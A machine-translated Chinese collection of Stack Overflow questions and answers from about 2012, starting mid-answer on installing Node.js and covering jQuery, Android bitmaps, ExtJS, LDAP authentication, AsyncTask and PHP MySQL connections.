# 目前的建议

*   如果您想使用您的用户帐户安装，请使用[nvm 。](https://github.com/creationix/nvm)（我个人更喜欢这个）
*   按照[此处](https://github.com/nodejs/node-v0.x-archive/wiki/Installing-Node.js-via-package-manager)的说明通过`apt`使用 PPA 进行安装。

* * *

# 旧答案

**注意：**在撰写本文时，我使用的是 Ubuntu 12.10。

有很多安装节点的方法。我个人更喜欢下载最新稳定版本的源代码并将其安装到`~/local`（您可以通过添加`--prefix`到[这里](https://github.com/joyent/node/wiki/Installation)`./configure`看到的命令来做到这一点。这样做真的没有任何“风险”，因为所有东西都安装在一个目录中与您系统的其余部分分开。您可以在[此处查看](https://github.com/dweldon/setup)我的系统安装脚本中的节点配方。我定期运行我的脚本以将我的安装升级到最新版本。`update_node.py`

或者，您可以按照[此处](https://github.com/joyent/node/wiki/Installing-Node.js-via-package-manager)的说明通过包管理器安装最新的稳定版本。我实际上并没有这样做，所以我无法评论它的效果如何。

我不会做的是从 ubuntu 宇宙包中安装节点。您最终会得到一个非常过时的版本（当前为 0.6.19）。

**2013 年 1 月 26 日更新：**

如果您有兴趣使用您的用户（非 root）帐户安装节点，我强烈建议您阅读[这篇](http://tnovelli.net/blog/blog.2011-08-27.node-npm-user-install.html)博文。我跳过了这`~/.npmrc`一步，但发现`~/.node_modules`符号链接步骤对于`require`正常工作至关重要。

**2014 年 12 月 30 日更新：**

我已经迁移到使用 linux mint 并进行二进制节点安装。如果您有兴趣编写自己的安装脚本，可以[在这里](https://github.com/dweldon/mint-setup)找到我当前的安装脚本。具体看看我在[node.sh](https://github.com/dweldon/mint-setup/blob/master/includes/node.sh)中所做的事情。该`execute`功能在第一次安装期间运行，因此它会执行诸如配置`.bashrc`. 该`install`函数由[update-node.sh](https://github.com/dweldon/mint-setup/blob/master/update-node.sh)运行，用于删除现有安装并添加新安装（最新版本或用户指定的版本）。

**2016 年 1 月 8 日更新：**

我刚刚切换到使用[nvm](https://github.com/creationix/nvm)。只需安装脚本，然后运行`nvm install node`以获取最新版本。这似乎是使用您的用户帐户安装节点的绝佳方式。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-12T13:54:01.710

另一个选项是 nvm（节点版本管理器）： [https ://github.com/creationix/nvm](https://github.com/creationix/nvm)

好处是它可以让您轻松地在版本之间切换。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-13T03:07:20.083

虽然我生活在 .rpm 而不是 .deb 领域，[`fpm`](https://github.com/jordansissel/fpm)但两者都可以（需要安装 Ruby）。我已经能够从最新的稳定源打包 node.js，没有任何重大困难。在您的情况下，以下情况可能会有所帮助：

```
./configure --prefix=/usr
make
mkdir -p /tmp/nodejs
make install DESTDIR=/tmp/nodejs
fpm -s dir -t deb -n nodejs -v 0.8.15 -p nodejs-0.8.15.deb -C /tmp/nodejs usr 
```

# javascript - 关于函数语法的2个问题，jQuery datapicker，beforeShowDay选项

> ID：13845322
> 
> 赞同：1
> 
> 时间：2012-12-12T17:29:18.690
> 
> 标签：javascript, jquery, jquery-ui-datepicker

我试图使用 jQuery datepicker 突出显示日历中的某些日期。我在这个论坛上从 Mark Murphy 那里找到了以下代码，[使用 jQuery 的 datepicker 突出显示特定范围内的日期](https://stackoverflow.com/questions/2385332/jquery-datepicker-highlight-dates)，效果很好，但是代码中有一些我不明白的地方。由于我没有足够的权限，我无法对原始答案发表评论。

我想知道的是：

1) || 的目的是什么 '' 在返回匹配日期的位中（函数返回 true）？

2）当函数返回false时，的目的是什么？

```
$(document).ready(function() {

var dates = {'2012/6/4':'some description' , '2012/6/6':'some other description'}; 

$('#datepicker').datepicker({                
   beforeShowDay: function(date) {

       var search = date.getFullYear() + "/" + (date.getMonth() + 1) + "/" + (date.getDate());

       //console.log(search);

       if (dates[search]) {
           return [true, 'highlight', dates[search] || ''];
       }

       return [false, '', ''];
   }

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:31:55.547

1)`dates[search] || ''`表示如果`dates[search]`未定义，则返回一个空字符串

2)`return [false, '', '']`返回一个包含 3 个元素的数组，其值为：false、void string、void string

从 JQueryUI 网站返回的数组定义：

[http://api.jqueryui.com/datepicker/#option-beforeShowDay](http://api.jqueryui.com/datepicker/#option-beforeShowDay)

> 函数将日期作为参数，并且必须返回一个数组，其中 [0] 等于 true/false 指示此日期是否可选，[1] 等于 CSS 类名称或默认表示为 ""，并且 [ 2] 此日期的可选弹出工具提示。在显示之前，它会在日期选择器中的每一天被调用。

# jquery - Fancybox 将 mouseover 更改为 mouseclick 以更改更大的图片？

> ID：13845327
> 
> 赞同：0
> 
> 时间：2012-12-12T17:29:34.123
> 
> 标签：jquery, fancybox, mouseover

我正在尝试建立一个包含 4 张小图片和一张大图片的图片库。就像今天一样，当我将鼠标悬停在较小的图片上时，较大的图片会发生变化，当我单击较小的图片时，我会得到一个大的浮动图片库。但是当我想将鼠标悬停功能更改为 mouseclick 时。因此，当我用鼠标单击小图片时，它会更改大图片而不是制作浮动图片。然后我必须用鼠标单击更大的图片才能获得浮动图像。有没有办法做到这一点？我试过想办法，但没有找到？

/皮特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T04:09:11.250

食谱。

你必须做三件事：

1）。从 ... 内的所有标签中删除*该类* ，因此不会启动fancybox。`thickbox``<a>``<div id="thumbs_list">`

2）。编辑文件[http://demo-store.prestashop.com/themes/prestashop_new/js/product.js](http://demo-store.prestashop.com/themes/prestashop_new/js/product.js)

查找第**424**行，上面写着

```
//hover 'other views' images management
  $('#views_block li a').hover(
     function(){displayImage($(this));},
     function(){}
  ); 
```

...并将其替换为

```
 $('#views_block li a').click(function(){
     displayImage($(this));
  }); 
```

3）。[如果适用，请接受此答案](https://meta.stackexchange.com/a/5235)；）

# .net - 与基类进行单元测试交互的方法

> ID：13845331
> 
> 赞同：3
> 
> 时间：2012-12-12T17:29:44.623
> 
> 标签：.net, unit-testing, inheritance, rhino-mocks

似乎有三种通用模式可用于测试派生类与其基类¹交互的方式。由于我在下面列出的原因，我真的不喜欢它们中的任何一个。有没有人使用其中一种（或另一种）测试基类交互的方法取得了长期成功？

*   [更改访问修饰符](http://geekswithblogs.net/MattRobertsBlog/archive/2008/12/16/how-to-make-a-quotprotectedquot-method-available-for-quotpartialquot-mocking-and-again.aspx)以允许`Friend`（`internal`在 C# 中）访问并设置`InternalsVisibleTo`为包含模拟框架/单元测试程序集

更改 SUT 以进行测试是一种*测试气味*。如果方法是`Protected`，那是`Protected`因为那是适合它的设计（实际上我还没有看到我称之为`Protected Friend`( `protected internal`) 的“有效”使用）。

*   [使用反射和扩展方法](http://ayende.com/blog/3044/dont-like-visibility-levels-change-that)来创建要模拟的方法的可访问版本......然后模拟它

这需要大量额外的工作来模拟单个方法，它不是完全类型安全的（例如，重命名会杀死它），并且（至少在 VB 中），需要创建一个`Module`将方法放入其中，这是一种设计噩梦（模块不能进入类，所以它们`Friend`最多需要受到限制，而且你的泛型更复杂）！

*   使用状态测试而不是行为测试。

根据基类的复杂程度，这可能需要比针对同一事物的单个行为测试更多的测试*。*考虑在状态测试中需要什么来匹配`Me.AssertWasCalled(Function(s) s.SendMessage(messageText, [to]))`where`SendMessage`是基类`Protected`方法。

¹`String`注意：在支持通过方法名称模拟受保护方法的 Moq 中，这不是必需的。正如 Ayende 在上面的链接中提到的，他特别避免了 Rhino Mocks 中任何非编译时类型的安全模拟（我认为这是一件好事！）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T21:05:34.330

只是我的拙见。

一般来说，测试与基类的交互并不是一个好主意。因为您将在此处测试*实现细节*。

如果与基类一起测试继承类似乎很复杂，那么可能是时候重构并使用聚合而不是继承了？

# android - OutOfMemoryError 使用位图 setImageUri

> ID：13845336
> 
> 赞同：1
> 
> 时间：2012-12-12T17:30:03.750
> 
> 标签：android, image, bitmap, uri

> **可能重复：**
> [Android：将图像加载到位图对象时出现奇怪的内存不足问题](https://stackoverflow.com/questions/477572/android-strange-out-of-memory-issue-while-loading-an-image-to-a-bitmap-object)
> [OutOfMemoryError：位图大小超出 VM 预算：- Android](https://stackoverflow.com/questions/2928002/outofmemoryerror-bitmap-size-exceeds-vm-budget-android)

我有一个应用程序，用户可以在其中拍照或使用画廊中已有的照片，并附加到新闻，在将新闻保存在数据库中后（我只保存图像路径内容：/ / ...），我显示ListView 中的所有新闻，带有图像标题和日期。要在适配器中显示图像，我正在使用以下内容：

```
...

image.setImageURI(null);
System.gc();            
image.setImageURI(Uri.parse(noticia.getIMAGEM()));

... 
```

然而即使使用 System.gc(); 每个加载的新图像都在获取

> 12-12 14:59:37.239: E / AndroidRuntime (4997): java.lang.OutOfMemoryError: 位图大小超出执行者 VM 预算

也已经尝试使用

```
image.setImageURI(null);
System.gc(); 
```

在 onResume()、onPause()、onDestroy() 中，但没有任何效果。

还阅读了这篇文章：[链接][1]

```
if(!((BitmapDrawable)image.getDrawable()).getBitmap().isRecycled()){
                ((BitmapDrawable)image.getDrawable()).getBitmap().recycle();
            }
            Bitmap thumbnail = null;
            try {
                thumbnail = MediaStore.Images.Media.getBitmap(context.getContentResolver(), Uri.parse(img));
            } catch (FileNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
             image.setImageBitmap(thumbnail); 
```

但后来我收到以下错误：

> 12-12 15:28:42.879: E/AndroidRuntime(5296): java.lang.RuntimeException: Canvas: 试图使用回收的位图 android.graphics.Bitmap@40756520

除了当我的列表视图上下滚动时它不断崩溃，我相信它正在请求图像..

我不知道还能做什么，有什么提示吗？

**编辑：**

我发现在解决这个问题的同一解决方案中的另一篇文章效果很好，但是我相信它需要一个图像缓存，因为当向上或向下滚动列表时，她战斗的那个，这对用户体验非常不利。有什么想法可以解决吗？

以下代码：

在适配器中：...

```
String imagePath = getPath(Uri.parse(img));
image.setImageBitmap(decodeSampledBitmapFromResource(imagePath, 85, 85)); 
```

...

方法：

```
public String getPath(Uri uri)  
    { 
        Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
        cursor.moveToFirst();
        int idx = cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATA);
        return cursor.getString(idx);
    } 

    public static int calculateInSampleSize(
            BitmapFactory.Options options, int reqWidth, int reqHeight) {
    // Raw height and width of image
    final int height = options.outHeight;
    final int width = options.outWidth;
    int inSampleSize = 2;

    if (height > reqHeight || width > reqWidth) {
        if (width > height) {
            inSampleSize = Math.round((float)height / (float)reqHeight);
        } else {
            inSampleSize = Math.round((float)width / (float)reqWidth);
        }
    }
    return inSampleSize;

    }

    public static Bitmap decodeSampledBitmapFromResource(String resId,
            int reqWidth, int reqHeight) {

        // First decode with inJustDecodeBounds=true to check dimensions
        final BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(resId, options);

        // Calculate inSampleSize
        options.inSampleSize = calculateInSampleSize(options, reqWidth, reqHeight);

        // Decode bitmap with inSampleSize set
        options.inJustDecodeBounds = false;
        return BitmapFactory.decodeFile(resId, options);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:38:45.300

听起来您想从本地图库中获取缩略图。SDK直接提供了一个更好的解决方案：

```
 // First decode with inJustDecodeBounds=true to check dimensions
        final BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        Bitmap thumbnail = Thumbnails.getThumbnail(context.getContentResolver(), /*ID of the local item*/, Thumbnails.MINI_KIND, options);
        // Calculate inSampleSize
        options.inSampleSize = UIUtils.calculateInSampleSize(options, reqWidth, reqHeight);
        // Decode bitmap with inSampleSize set
        options.inJustDecodeBounds = false;
        thumbnail = Thumbnails.getThumbnail(context.getContentResolver(), /*ID of the local item*/, Thumbnails.MINI_KIND, options); 
```

# javascript - 如何在 sencha 中使用全屏模式选项实现图片库

> ID：13845344
> 
> 赞同：1
> 
> 时间：2012-12-12T17:30:33.950
> 
> 标签：javascript, html, extjs, sencha-touch, sencha-touch-2

我想实现一些类似于以下链接的东西

[http://dimsemenov.com/plugins/royal-slider/gallery/](http://dimsemenov.com/plugins/royal-slider/gallery/)

在煎茶触摸 2.1

任何人都可以给出一个想法，或者他们的任何资源是否可以在 sencha touch 2.1 中实现

我认为是全屏模式的触摸我可以在全视图中推送另一个带有图像库的视图.......但这并没有真正的感觉就像从面板放大......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-22T05:17:43.773

您需要一个轮播和一个列表...将列表的内联属性设置为 wrap 并将图像加载为列表项...这将为您提供您想要的下面的图片...使用轮播作为顶部图像...在点击图片时编写一个处理程序，该处理程序将打开一个包含相同组件的面板以实现全屏效果......同时给出一个 showAnimation 像弹出......

希望能帮助到你...

# c# - 如何在 WPF C# 应用程序中使用 SlimDX

> ID：13845345
> 
> 赞同：3
> 
> 时间：2012-12-12T17:30:45.240
> 
> 标签：c#, slimdx

我对 SlimDX 和 WPF 完全陌生，但我需要在我的应用程序中创建多个图像，其中一个需要是点渲染的 3d 可视化器，如下所示：http: [//img600.imageshack.us/ img600/5879/6a00d83452464869e2017ee.gif](http://img600.imageshack.us/img600/5879/6a00d83452464869e2017ee.gif)

我发现我可以在我的应用程序中使用 SlimDX 通过 C# 指令使用 DirectX，将结果写入 D3DImage 组件。经过一些尝试，我制作了 Visual Studio 2012 来重新识别 D3DImage（出于某种原因，我需要重新启动 Windows 才能使其工作）但我不知道一些事情：

*   如何在 D3DImage 中初始化 DirectX 窗口？我真的找不到任何示例或源代码。我能找到的所有示例（例如 SlimDX 上的 3 个小示例）都超出了 WPF 上下文
*   我在哪里可以找到一些关于 SlimDX 的好文档？GameDev 社区似乎有点问题，我无法发布任何内容（可能是因为我没有付费）而且我在任何地方都找不到任何东西！我该怎么学呢？
*   没有一个来自 SVN 的 SlimDX 示例可以编译。我总是在使用 SlimDX 库（空路径）时遇到一些参考错误，甚至从正确的路径重新导入也无法解决它

这让我发疯了 D：

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-25T16:43:37.420

我感觉到你的痛苦。由于缺乏这样做的理由，我没有在 SlimDX 中使用 D3D 东西做太多工作，但我一直在玩 DirectSound 和 DirectInput，所以我会告诉你我发现了什么。

第一个要点：我不确定在图像中初始化 D3D 窗口是否有效。如果您使用 Windows 窗体作为基础，SlimDX 包含一个 RenderForm 或一些 Windows.Forms 的子类，并提供相当数量的功能。我仍然没有为 WPF 弄清楚它，即使应该有一个示例。

第二个要点：文档很难获得。网站上有一些东西，这里也有一些东西，但真正有用的是 DirectX 的 MSDN 参考。SlimDX 很好地反映了结构，您可以通过阅读了解很多。它确实需要一些转换，因为 DirectX 引用是 C++。

第三个子弹：同样的问题。一直无法弄清楚为什么。

希望那些对你有帮助。

# javascript - 使用 javascript 调整 iframe 的大小

> ID：13845347
> 
> 赞同：0
> 
> 时间：2012-12-12T17:30:55.037
> 
> 标签：javascript, iframe

我正在尝试使用 javascript 在网站上调整 iframe 的大小，以便 iframe 与里面的内容一样长。我的代码如下：

```
var iFrames = $('iframe');

function iResize() {        
    for (var i = 0, j = iFrames.length; i < j; i++) {
        iFrames[i].style.height = iFrames[i].contentWindow.document.body.offsetHeight + 'px';
    }
}

console.log( 'resize frame before' );
if ($.browser.safari || $.browser.opera) {
    console.log( 'if' );            
    iFrames.load(function(){
        setTimeout(iResize, 0);
    });

    for (var i = 0, j = iFrames.length; i < j; i++) {
        var iSource = iFrames[i].src;
        iFrames[i].src = '';
        iFrames[i].src = iSource;
    }               
} else {
    console.log( 'else' );
    $( '.iframe' ).load(function() { 
        console.log( 'load' );
        this.style.height = this.contentWindow.document.body.offsetHeight + 'px';
    });
}
console.log( 'resize frame end' ); 
```

它不起作用，但是使用 console.log 唯一没有出现的日志是在“加载”函数内。

我正在调用页面底部的所有 javascript，我不确定这是否导致问题。

任何帮助将不胜感激。

* * *

编辑：源代码在[https://github.com/xonorageous/projet-sas](https://github.com/xonorageous/projet-sas) 网站可以在[http://daniel-lucas.com/experiments-dir/projet-sas/查看](http://daniel-lucas.com/experiments-dir/projet-sas/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:45:54.483

您可以在 jQuery 中更轻松地实现这一点：

```
$(function(){

        var iFrames = $('iframe');

        function iResize() {

            for (var i = 0, j = iFrames.length; i < j; i++) {
              iFrames[i].style.height = iFrames[i].contentWindow.document.body.offsetHeight + 'px';}
            }

            if ($.browser.safari || $.browser.opera) { 

               iFrames.load(function(){
                   setTimeout(iResize, 0);
               });

               for (var i = 0, j = iFrames.length; i < j; i++) {
                    var iSource = iFrames[i].src;
                    iFrames[i].src = '';
                    iFrames[i].src = iSource;
               }

            } else {
               iFrames.load(function() { 
                   this.style.height = this.contentWindow.document.body.offsetHeight + 'px';
               });
            }

        }); 
```

请参阅此处获取原始来源> [http://css-tricks.com/snippets/jquery/fit-iframe-to-content/](http://css-tricks.com/snippets/jquery/fit-iframe-to-content/)

# ios - 关于在较新的 xcode 版本中使用旧的 Xcode 项目并为商店构建的困惑

> ID：13845349
> 
> 赞同：2
> 
> 时间：2012-12-12T17:30:58.240
> 
> 标签：ios, xcode, app-store

我刚刚为IOS开发了一个项目。我当前的 Xcode 版本是 4.0.2 。我的目标是IOS 4.3。

我的客户只要求我在最后交付 xcode 项目，这样他就可以自己提交给苹果商店。

现在他声称他无法使用我正在使用的 Xcode 版本发布产品，只能使用 Xcode 4.5.2 来完成！

1.  他是对的吗？，我试图找到有关此的官方信息，但没有成功。现在只能使用 Xcode 4.5.2 版本交付项目了吗？（我希望 Apple 强制使用更新的 xcode 版本，但最新版本？）。

2.  如果是这样，他不能只使用我交付给他的项目并在他最近的 XCode 版本中构建商店吗？还是我需要升级到最新的 xcode 版本？

3.  苹果现在接受提交的最低 SDK 目标版本是多少？我相信它是 4.3，但现在是更高版本？

4.  假设我的客户是正确的，Snow leopard 用户目前根本不可能将构建交付到商店？因为最近的 Xcode 版本要求用户至少在 Lion OS 中。

5.  如果我理解正确，Xcode 版本 4.5 删除了对构建 armv6 组件的支持，基本上迫使开发人员放弃对 iOS 4.2.1 之前的 iOS 版本的支持，如果理解意味着不再支持 3G 和旧设备。这是否意味着 iPhone 3G 和前两代 iPod touch 已“弃用”？

感谢您的理解和指导。

# c# - 任何下降的WPF自定义窗口主题，没有在模拟边框上调整大小的透明边框？

> ID：13845353
> 
> 赞同：0
> 
> 时间：2012-12-12T17:31:17.740
> 
> 标签：c#, wpf, themes, controltemplates

我已经四处寻找了很长一段时间，并不能真正找到一个完整的例子，可能只是缺少一些小元素。

我正在尝试为 WINDOW 创建 WPF 主题/样式/ControlTemplate/等。窗口边框设置为无，允许透明，背景设置为透明的一种。所以，是的，这意味着我必须像在其他示例中找到的那样定义按钮、边框、背景等。

我发现一些链接通过使用锚定在右下角的“Thumb”控件来利用（并使其正常工作）。

我缺少的是如何从主题的新 ControlTemplate 中构建的各个边框调整大小。我确实有用于最小/最大/恢复/关闭之类的按钮，但无法完全了解如何处理调整大小。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:53:47.350

我用过这个链接一次。如果我没记错的话，即使没有“真正的”边框元素，调整大小的边框也可以设置为窗口两侧的任意数量的像素。

[http://www.codeproject.com/Articles/131515/WPF-Custom-Chrome-Library](http://www.codeproject.com/Articles/131515/WPF-Custom-Chrome-Library)

# extjs - 我的 EXT JS 4 模型数据在哪里？

> ID：13845354
> 
> 赞同：0
> 
> 时间：2012-12-12T17:31:18.847
> 
> 标签：extjs

使用 Ext JS 4.1....

我有一个显示一堆模型实例的网格，尽管只显示了一些字段。然后我有一个双击监听器，我想将整个记录加载到一个表单中进行编辑。在双击侦听器中，我没有看到我的 hasMany 关联中的数据，尽管根据 Firebug 的网络显示正在返回 json 数据，我在其中看到来自服务器调用的响应。我的模型有问题还是我要解决这个问题？

请求.js

```
Ext.define('Request', {
    extend: 'Ext.data.Model',
    requires: ['PointOfContact'],
    fields: [
       {name: 'id', type: 'int'},
       {name: 'project', type: 'string'},
       {name: 'purpose', type: 'string'},
       {name: 'status'},
       {name: 'additionalInfo', type: 'string'}
    ],
    hasMany: [{
       model: 'PointOfContact',
       name: 'pointOfContacts',
       foreignKey: 'id',
       associationKey: 'pointOfContacts'
   }],
   proxy: {
      type: 'rest',
      url: '/web/project/rest/request/',
      reader: { type: 'json' },
      writer: { type: 'json' }
   }
}); 
```

PointOfContact.js

```
Ext.define('PointOfContact', {
  extend: 'Ext.data.Model',
  fields: [
    {name: 'id', type: 'int'},
    {name: 'fullName', type: 'string'},
    {name: 'email', type: 'string'},
    {name: 'phone', type: 'string'}
  ]
}); 
```

请求.js

```
Ext.define('Requests', {
  extend: 'Ext.data.Store',
  model: 'Request',
  autoLoad: true
}); 
```

RequestsView.js

```
Ext.define('RequestsView', {
  extend: 'Ext.grid.Panel',
  title: 'All Requests',
  store: 'Requests',
  viewConfig: {
     singleSelect: 'true',
     listeners: {
     itemdblclick: function(dataview, record, item, index, e) {
        console.log(record.get('project'));
        console.log(record.get('purpose'));
        console.log(record.get('status'));
        console.log(record.get('additionalInfo'));
        console.log(record.get('pointOfContacts'));
        var comp = Ext.ComponentQuery.query('requestForm');
        comp[0].getForm().loadRecord(record);
        var mainPanel = Ext.ComponentQuery.query('mainpanel');
        mainPanel[0].getLayout().setActiveItem('requestForm');
        }
      }
    },
   columns: [
      {header: 'Project', dataIndex: 'project', flex: 1},
      {header: 'Purpose', dataIndex: 'purpose', flex: 1},
      {header: 'Status', dataIndex: 'status', flex: 1}
   ]
}); 
```

因此，在控制台中，我看到了项目、目的、状态和附加信息的值，但我得到了 pointOfContacts 的“未定义”。

有什么建议么？

***使用最终工作代码更新：*** 这是我用来检索 pointofContacts 并使用 pointOfContacts 在我的表单面板上加载网格的工作代码

```
...
itemdblclick: function(dataview, record, item, e) {
    var comp = Ext.ComponentQuery.query('requestForm');
    comp[0].getForm().loadRecord(record);
    Ext.getCmp('pocGrid').reconfigure(record.pointOfContacts());
    var mainPanel = Ext.ComponentQuery.query('mainpanel');
    mainPanel[0].getLayout().setActiveItem('requestForm');
}
.... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:41:40.263

有很多关联默认不解析到关联记录中。特别是对于网格 - 因为它应该是一个平面数据视图。[模型](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Model)文档向您展示了如何设置关联，但没有说明为您创建实例的任何内容:) 有很多使用的链接 ( [http://docs.sencha.com/ext-js/4-1/#! /api/Ext.data.association.HasMany](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.association.HasMany)）来自模型文档。不幸的是，用法不是您所期望的。本质上，它旨在通过调用存储来加载来按需获取记录。

# php - 使用数据库中的数据进行 Ajax 实时搜索

> ID：13845358
> 
> 赞同：3
> 
> 时间：2012-12-12T17:31:38.420
> 
> 标签：php, ajax, database, multiple-select, livesearch

我见过一些（解释清楚的）示例，其中在 xml 文件中可以找到实时搜索的可用结果。但只有少数（解释得很糟糕）的结果来自数据库。我对第二种情况感兴趣。

一种解决方案可能是预取数据库数据并将它们放在一个 xml 对象中，其余的可以以相同的方式工作。这是我可以轻松实现的。

我正在寻找另一种方式，即用户键入一个字母（例如“c”）并在现场生成建议（例如“胡萝卜”、“卷心菜”、“芹菜”、“柑橘”）。这是否可以通过调用数据库来实现

`"SELECT name FROM vegetables WHERE name LIKE c%"`?

如果用户然后按下另一个字母怎么办？（例如'ca'，所以推荐的结果应该是'carrot', 'cabbage'）。按下的每个键都应该启动一个新的`SELECT`? 出于某种原因，这听起来不是一个好的解决方案。

有没有办法实现第二种方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-21T11:27:32.403

您可以通过在 jquery 中的每个按键功能上发送 ajax 请求来实现这一点。作为响应，以 json 格式发回结果，以便在文本字段下方的无序列表中显示它们。单击此的 li 用文本字段中的值填充文本框。

# c# - 区分大小写的 LDAP 查询

> ID：13845365
> 
> 赞同：1
> 
> 时间：2012-12-12T17:31:59.350
> 
> 标签：c#, active-directory, ldap

我正在使用 DirectoryEntry/DirectorySearcher 进行 LDAP 查询，以通过 C# Web 应用程序对 Active Directory 中的用户进行身份验证（ConnectionString 属性仅相当于 LDAP://server.domain）：

```
internal bool AuthenticateUser(string username, string password)
{
    if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
        return false;

    var entry = new DirectoryEntry(this.ConnectionString, username, password);
    var searcher = new DirectorySearcher { SearchRoot = entry, Filter = "(objectclass=user)" };

    try
    {
        var result = searcher.FindOne();
        return true; //connection to AD succeeded, authentication was successful
    }
    catch (DirectoryServicesCOMException)
    {
        return false; //impersonating the user failed
    }
} 
```

这些查询都针对 SBS 服务器，当您创建新用户时，该服务器似乎使用大写值作为 Windows 2000 之前的名称（即 NetBIOS）。因此，如果我添加一个名为“Test User”的新用户，用户名可能是“tuser”，但它指定的 NetBIOS 名称是“TUser”。当用户输入命中此方法的用户/通行证时，“tuser”无法通过身份验证，而“TUser”成功。

我的问题是是否可以修改它以使用户名不必区分大小写？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:44:27.540

模式中的属性定义定义了哪些字符可用于正在定义的属性的属性值中。匹配规则（也在模式中的属性定义中）确定如何比较属性值的相等性、子字符串、排序等。匹配规则决定了属性比较的“区分大小写”（虽然它真的没那么简单）。

服务器（和客户端）在比较属性值时必须使用匹配规则。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-01-22T14:35:52.887

对于 OpenLDAP，有一种语法以区分大小写的方式过滤值。

两个简短的例子：

```
(&(ou:caseExactMatch:=cwm)(objectClass=person))

+ will match case-sensitive ou= value of 'cwm'
- will NOT match 'CWM', 'CwM' or 'Cwm'

(&(ou=cwm)(objectClass=person))

+ will match case-insensitive (by default) all ou= values like 'cwm', 'CWM', 'CwM', 'Cwm' 
```

语法似乎是：

```
attr:matchingRule:=value 
```

*   参见“8.3.4 匹配规则”：
    [https ://access.redhat.com/documentation/en-US/Red_Hat_Directory_Server/8.2/html/Administration_Guide/Finding_Directory_Entries-LDAP_Search_Filters.html#using-matching-rules](https://access.redhat.com/documentation/en-US/Red_Hat_Directory_Server/8.2/html/Administration_Guide/Finding_Directory_Entries-LDAP_Search_Filters.html#using-matching-rules)

*   还有几种`matchingRule`类型：
    [https ://ldapwiki.com/wiki/MatchingRule](https://ldapwiki.com/wiki/MatchingRule)

# android - Android - 传递不同类型的数据

> ID：13845366
> 
> 赞同：1
> 
> 时间：2012-12-12T17:32:09.863
> 
> 标签：android, types, android-asynctask

我想要实现的目标如下 - 我有一个 java 类，它调用一个 URL（传递给它），它返回 JSON，它从处理数据的调用活动中调用一个回调。

这允许 aSyncTask 代码的可重用性。

在某些情况下，我需要将发布数据传递给被调用的 URL，因此我创建了一个新方法，允许我添加数据

```
HashMap<String, String> mData;        

public void AddDataToPost(HashMap<String, String> data) {
        mData = data;
     } 
```

然后我用我的 httprequest 传递这些数据。

我的问题如下。

我希望能够传递任何类型的数据。例如 HashMap .. 但我不能这样做，因为我在初始化 var 时必须指定位。

我可以创建一个 addHashMap 方法，但同样的问题出现在 var 被初始化为 String，String。

我将如何在允许传递任何数据形式的同时重用代码？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:42:07.633

您可以在 Asynctask 类中使用类构造函数，向其传递 的 hashmap `<String, Object>`，然后您可以在 Asynctask 的任何位置使用它：

```
public class MyTask extends AsyncTask<String, Void, String>
{
    private Map<String, Object> myMap;
    private String myString;

    public MyTask(Map<String, Object> myMap, String myString) {
        this.myMap = myMap;
        this.myString = myString;
    }
    @Override
    protected Void doInBackground(String... params) {
        //do stuff with params and myMap
    }
} 
```

MainActity.java：

```
Map<String, Object> myMap = new HashMap<String, Object>();
//Add stuff to myMap
new MyTask(myMap, "mystring").execute(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:02:30.510

您可以定义您的类以使用原始类型，例如

```
public MyClass<T>{
   ...
} 
```

然后你可以这样做：

```
MyClass<Integer> intMyClass = new MyClass<>();

MyClass<String>  strMyClass = new MyClass<>(); 
```

请注意，您不能传递原语，因此您必须将整数装箱等等。

请参阅有关 Java 泛型的本教程。

[http://docs.oracle.com/javase/tutorial/java/generics/types.html](http://docs.oracle.com/javase/tutorial/java/generics/types.html)

# php - 在mysql连接之间交替

> ID：13845373
> 
> 赞同：0
> 
> 时间：2012-12-12T17:32:48.260
> 
> 标签：php, mysql

这几天我一直在想办法解决这个问题。我有 4 个需要连接的数据库。我试图在连接之间交替，但它不会让我。它总是需要最后一个连接。

```
$link = mysql_connect("localhost","root",""); 
mysql_select_db("front",$link); 
$link2 = mysql_connect("mysite.com","user","2012");
mysql_select_db("db1",$link2);
$link3 = mysql_connect("mysite.com","user","2012");
mysql_select_db("appsdb",$link3);
$link4 = mysql_connect("mysite.com","user","2012", TRUE);
mysql_select_db("storagedb",$link4); 
```

我需要做什么？

**这有效，但需要太长时间**

```
$link = mysql_connect("localhost","root",""); 
mysql_select_db("front",$link); 
$link2 = mysql_connect("mysite.com","user","2012",true);
mysql_select_db("db1",$link2);
$link3 = mysql_connect("mysite.com","user","2012",true);
mysql_select_db("appsdb",$link3);
$link4 = mysql_connect("mysite.com","user","2012", true);
mysql_select_db("storagedb",$link4); 
```

是否可以完全分离连接但仍然在查询中使用 $link、$link2、$link3、$link4？我不认为保持所有连接打开是有效的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:07:13.557

我不会像其他人那样评论使用mysqli，我猜从所有这些评论中，你已经知道你应该切换，所以我只会回复答案，也许它可以帮助其他无法升级php的人由于某些原因。

